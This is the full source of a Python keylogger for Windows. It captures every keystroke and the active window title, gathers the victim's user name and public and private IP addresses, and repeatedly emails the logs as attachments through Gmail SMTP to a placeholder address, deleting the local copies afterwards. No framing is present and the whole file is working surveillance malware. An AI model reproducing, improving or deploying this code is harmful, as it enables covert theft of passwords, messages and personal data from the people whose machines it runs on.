from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import threading
import win32gui

def on_press(key):
    global old_app

    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows start menu'
    
    substitution = {
        Key.enter: '[ENTER]\n',
        Key.backspace: '[BACKSPACE]',
        Key.space: ' ',
        Key.alt_l: '[ALT]',
        Key.tab: '[TAB]',
        Key.delete: '[DEL]',
        Key.ctrl_l: '[CTRL]',
        Key.left: '[LEFT ARROW]',
        Key.right: '[RIGHT ARROW]',
        Key.shift: '[SHIFT]',
        '\x13': '[CTRL-S]',
        '\x17': '[CTRL-W]',
        Key.caps_lock: '[CAPS LK]',
        '\x01': '[CTRL-A]',
        Key.cmd: '[WINDOWS KEY]',
        Key.print_screen: '[PRNT SCR]',
        '\x03': '[CTRL-C]',
        '\x16': '[CTRL-V]'
    }

    key_str = str(key).strip('\'')
    
    if key in substitution:
        logged_data.append(substitution[key] + ' ')
    else:
        logged_data.append(key_str + ' ')

def write_file(count):
    file_path = os.path.expanduser('~') + '/Documents/'
    filename = f'{count}I{random.randint(1000000, 9999999)}.txt'
    file = file_path + filename
    delete_file.append(file)

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))

def send_logs():
    count = 0

    from_addr = 'your_email@gmail.com'
    from_pswd = 'your_password'
    to_addr = 'recipient_email@example.com'

    MIN = 10
    SECONDS = 60

    time.sleep(10)
    while True:
        if len(logged_data) > 1:
            try:
                write_file(count)

                subject = f'[{user}] ~ {count}'

                msg = MIMEMultipart()
                msg['From'] = from_addr
                msg['To'] = to_addr
                msg['Subject'] = subject
                body = 'Log files attached.'
                msg.attach(MIMEText(body, 'plain'))

                attachment = open(delete_file[0], 'rb')

                filename = delete_file[0].split('/')[-1]

                part = MIMEBase('application', 'octet-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('content-disposition', f'attachment; filename={filename}')
                msg.attach(part)

                text = msg.as_string()

                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.starttls()
                s.login(from_addr, from_pswd)
                s.sendmail(from_addr, to_addr, text)
                s.quit()

                os.remove(delete_file[0])
                del logged_data[:]
                del delete_file[:]
                count += 1

            except Exception as e:
                print("An error occurred:", e)

if __name__ == '__main__':
    publicIP = requests.get('https://api.ipify.org').text
    privateIP = socket.gethostbyname(socket.gethostname())
    user = os.path.expanduser('~').split('\\')[2]
    datetime = time.ctime()

    print(privateIP)
    print(user)

    msg = f'[START OF LOGS]\n *~ Date/Time: {datetime}\n *~ User-Profile: {user}\n *~ public-IP: {publicIP}\n *~ Private-IP: {privateIP}\n\n'

    logged_data = []
    logged_data.append(msg)

    old_app = ''
    delete_file = []

    T1 = threading.Thread(target=send_logs)
    T1.start()

    with Listener(on_press=on_press) as listener:
        listener.join()
